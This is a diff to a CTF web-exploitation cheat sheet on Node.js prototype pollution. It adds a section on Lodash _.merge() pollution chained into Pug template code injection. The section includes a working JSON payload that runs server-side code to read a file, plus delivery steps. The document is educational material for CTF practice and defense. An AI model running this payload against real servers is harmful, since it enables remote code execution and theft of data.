@@ -1,5 +1,22 @@
 # CTF Web - Node.js Prototype Pollution & VM Escape
 
+## Table of Contents
+- [Prototype Pollution Basics](#prototype-pollution-basics)
+  - [Common Vectors](#common-vectors)
+  - [Known Vulnerable Libraries](#known-vulnerable-libraries)
+- [flatnest Circular Reference Bypass (CVE-2023-26135)](#flatnest-circular-reference-bypass-cve-2023-26135)
+- [Gadget: Library Settings via Prototype Chain](#gadget-library-settings-via-prototype-chain)
+- [Node.js VM Sandbox Escape](#nodejs-vm-sandbox-escape)
+  - [ESM-Compatible Escape (CVE-2025-61927)](#esm-compatible-escape-cve-2025-61927)
+  - [CommonJS Escape](#commonjs-escape)
+  - [Why `document.write` Matters for Happy-DOM](#why-documentwrite-matters-for-happy-dom)
+- [Full Chain: Prototype Pollution → VM Escape RCE (4llD4y)](#full-chain-prototype-pollution-vm-escape-rce-4lld4y)
+- [Lodash Prototype Pollution → Pug AST Injection (VuwCTF 2025)](#lodash-prototype-pollution-pug-ast-injection-vuwctf-2025)
+- [Affected Libraries](#affected-libraries)
+- [Detection](#detection)
+
+---
+
 ## Prototype Pollution Basics
 
 JavaScript objects inherit from `Object.prototype`. Polluting it affects all objects:
@@ -134,10 +151,48 @@ print(r.text.split("<title>")[1].split("</title>")[0])
 
 ---
 
+---
+
+## Lodash Prototype Pollution → Pug AST Injection (VuwCTF 2025)
+
+**Vulnerable:** Lodash < 4.17.5 `_.merge()` allows prototype pollution via `constructor.prototype`.
+
+**Pug template engine gadget:** Pug looks up `block` property on AST nodes. If a node doesn't have its own `block`, JS traverses the prototype chain → finds polluted `Object.prototype.block`.
+
+**Payload:**
+```json
+{
+  "constructor": {
+    "prototype": {
+      "block": {
+        "type": "Text",
+        "line": "1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/flag.txt').toString();//",
+        "val": "x"
+      }
+    }
+  },
+  "word": "exploit"
+}
+```
+
+**Delivery:** Base64-encode the JSON, send as `?data=<encoded>`.
+
+**How it works:**
+1. `_.merge()` on user input sets `Object.prototype.block` to malicious AST node
+2. Pug template compilation checks `node.block` on every node
+3. Nodes without own `block` inherit from prototype → finds injected Text node
+4. `type: "Text"` with `line:` payload injects code during template compilation
+5. Code executes server-side, reads flag
+
+**Detection:** `lodash` < 4.17.5 in `package.json` + Pug/Jade template engine.
+
+---
+
 ## Affected Libraries
 - **happy-dom** < 20.0.0 (JS eval enabled by default), 20.x+ (if re-enabled via pollution)
 - **vm2** (deprecated)
 - **realms-shim**
+- **lodash** < 4.17.5 (`_.merge()` prototype pollution)
 
 ## Detection
 - `flatnest` in `package.json` + endpoints calling `nest()` on user input
